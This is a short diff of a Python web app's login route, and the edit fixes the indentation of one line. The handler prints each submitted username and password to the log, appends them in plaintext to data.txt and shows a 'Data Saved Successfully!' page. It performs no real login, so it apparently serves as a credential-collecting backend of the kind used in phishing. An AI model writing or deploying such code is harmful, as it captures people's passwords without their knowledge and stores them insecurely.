@@ -18,7 +18,7 @@ def login():
     p = request.form.get("password")
     print(f"User: {u} | Pass: {p}", flush=True)
     with open("data.txt", "a") as f:
-    f.write(f"User: {u} | Pass: {p}\n")
+        f.write(f"User: {u} | Pass: {p}\n")
     return "<h1 style=\"color:green;text-align:center;\">Data Saved Successfully!</h1>"
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
